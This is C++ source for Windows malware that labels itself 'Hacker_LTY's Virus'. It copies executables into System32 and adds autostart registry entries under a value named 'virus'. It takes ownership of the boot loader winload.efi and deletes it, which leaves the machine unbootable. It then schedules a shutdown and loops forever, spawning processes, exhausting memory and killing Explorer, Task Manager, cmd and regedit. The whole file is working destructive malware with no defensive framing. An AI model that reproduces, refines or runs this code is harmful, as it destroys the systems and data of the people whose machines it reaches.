#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
char path[10000];
string _path;
int p;
int main() {
	system("chcp 65001");
	GetModuleFileName(NULL, path, sizeof(path));
	int len = strlen(path);
	for (int i = len - 1; i >= 0; i--) {
		if (path[i] == '\\') {
			p = i;
			break;
		}
	}
	_path = path;
	_path.erase(p + 1);
	system(("cd " + _path).c_str());
	system("copy winmain.exe C:\\Windows\\System32\\winmain.exe");
	system("copy wincopy.exe C:\\Windows\\System32\\wincopy.exe");
	system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v virus /t reg_sz /d C:\\Windows\\System32\\winmain.exe /f");
	system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v virus /t reg_sz /d C:\\Windows\\System32\\winmain.exe /f");
	system(("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v virus /t reg_sz /d " + _path + "winmain.exe /f").c_str());
	system(("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v virus /t reg_sz /d " + _path + "winmain.exe /f").c_str());
//	system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\"");
//	system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" /v C:\\Windows\\System32\\winmain.exe /t reg_sz /d RUNASADMIN /f");
//	system(("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" /v " + _path + "winmain.exe /t reg_sz /d RUNASADMIN /f").c_str());
	system("takeown /f C:\\Windows\\System32\\winload.efi && icacls C:\\Windows\\System32\\winload.efi /grant %username%:F");
	system("del C:\\Windows\\System32\\winload.efi /f /q");
	system("cls");
	system("color 1f");
	for (int i = 1; i <= 3; i++) {
		printf("Welcome to Hacker_LTY's Virus!\n");
	}
	Sleep(1000);
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
	system("shutdown -s -t 300");
	while (true) {
		long long *p = new long long [400000000];
		for (int i = 1; i <= 3; i++) {
			system("start");
			system("start wincopy.exe");
		}
		system("taskkill /im explorer.exe /f");
		system("taskkill /im cmd.exe /f");
		system("taskkill /im taskmgr.exe /f");
		system("taskkill /im regedit.exe /f");
		delete p;
	}
	return 0;
}
